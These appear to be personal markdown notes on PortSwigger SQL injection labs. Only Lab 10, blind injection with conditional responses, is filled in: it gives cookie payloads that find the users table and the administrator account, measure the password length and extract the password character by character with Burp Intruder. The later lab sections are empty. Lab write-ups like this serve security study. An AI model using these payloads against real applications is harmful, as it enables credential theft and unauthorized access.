<div align="center">
  <h1>-------------------------- SQLi LABS 002 ---------------------------</h1>
</div>

# [CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Lab 10: Blind SQL injection with conditional responses [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#)
- This injection will be used in `Cookie` section in `TrackingID` input field of the page.

```
TrackingId=mCKLbQonMlRUp42B' AND '1'='1;  #Returns 'Welcome Back', This boolean condition means the page is vul to Bilnd SQLi
TrackingId=mCKLbQonMlRUp42B' AND '1'='2; #Doesn't Returns 'Welcome Back' 

TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users LIMIT 1)='a;  #Confirming that there is a table called users
TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users where username='administrator')='a; #confirming that there is a user called administrator

TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a #confirming that the password is greater than 1 character in length.
TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users where username='administrator' AND LENGTH(password)>19)='a; #Password is 20 char long
```


### After determining the length of the password, the next step is to `test the character at each position` to determine its value.
- This step involve `Intruder` Module, set the Type: Sniper, Position: $a$, Intruder Setting: Grep-Match 'Welcome Back'
- Injection: `TrackingId=mCKLbQonMlRUp42B' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§;`
- Repeat the same step for every position i.e SUBSTRING(password,2 to 20,1)
- On correct position guessed by payload, it'll flag the `Welcome Back` in result.
- Take the guessed char & note it down.
- ![image](https://github.com/user-attachments/assets/c07e3d8c-e54b-40b1-a268-48a0263e764e)

### Related Concepts: SUBSTRING(string, start_position, length)
```
string: The string from which you want to extract the substring.
start_position: The position in the string to start extracting (1-based index).
length: The number of characters to extract.
```

## Lab 11: Blind SQL injection with conditional errors [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors)
```
```


## Lab 11: Visible error-based SQL injection [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based)



## Lab 12: Blind SQL injection with time delays and information retrieval [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval)


